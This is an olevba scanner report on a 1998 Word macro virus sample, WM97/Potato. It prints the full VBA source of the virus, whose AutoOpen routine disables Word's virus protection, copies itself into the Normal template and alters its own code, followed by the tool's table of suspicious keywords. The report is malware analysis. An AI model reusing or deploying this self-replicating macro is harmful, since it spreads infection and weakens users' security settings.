olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.dv-5a707d7ab2627d00ef716e5fca518596028bd7ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.dv-5a707d7ab2627d00ef716e5fca518596028bd7ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Randomize
u = 0
q = 0

On Error GoTo 11
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

pt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
tp = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
If tp > 0 And pt > 0 Then GoTo 11
If tp = 0 Then
    
    Set Potato = NormalTemplate.VBProject.VBComponents
    Set cake = ActiveDocument.VBProject.VBComponents
    it = Int(Rnd(1) * 20) + 1
If it = 17 Then
    
    rx = Int(Rnd(1) * 10) + 1
    If rx = 9 Then GoTo 22
    MsgBox "Do you want fries with that??", vbInformation, ":)"
    MsgBox "Ummm....I think you have a " & Chr(86) & Chr(73) & Chr(82) & Chr(85) & Chr(83) & " !!!", vbCritical, "Problem With Word :("
    
    MsgBox "Do you have an Anti-Virus", vbYesNo, "Anti-Virus"
    MsgBox "Have you paid your VISA recently", vbYesNoCancel, "Visa Payment made ?"
    MsgBox "This is fun, isn't it??", vbInformation, "This is fun!!"
    MsgBox "WM97/Potato" & vbCrLf & "(C) 1998 VEiN [SOS]" & vbCrLf & "Thanks goes to Webmaster V for all his help :)", vbInformation, "WM97/Potato"
    
    MsgBox "Word doesn't feel well" & vbCrLf & "It says it wants to rest", vbCritical, "Word is SICK!!!"
    Application.Quit
End If
If pt = 0 Then
    
    Set Potato = Active.Document.VBProject.VBComponents
    Potato.Item(1).codemodule.AddFromFile Application.StartupPath & "Potato"
With Potato.Item(1).codemodule
For e = 1 To 4

.deletelines 1
Next e
End With
If tp > 0 And pt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Potato.Item(1).codemodule
    For e = 5 To Potato.Item(1).codemodule.countoflines Step 5
        u = Int(Rnd(109934) * 235514) + 5911
        q = Int(Rnd(446234) * 664320) + 9813
        
        .replaceline e, "'" & u * u & q * q & q * u & u * u & u * q
    Next e
End With
GoTo 11

22:
    cake.Item(1).Name = Potato.Item(1).Name
    cake.Item(1).Export Application.StartupPath & "Potato"
    Return

11:
If tp <> 0 And pt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ViewVBCode()

'WM97/Potato by VEiN Quiero una hamburguesa :)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
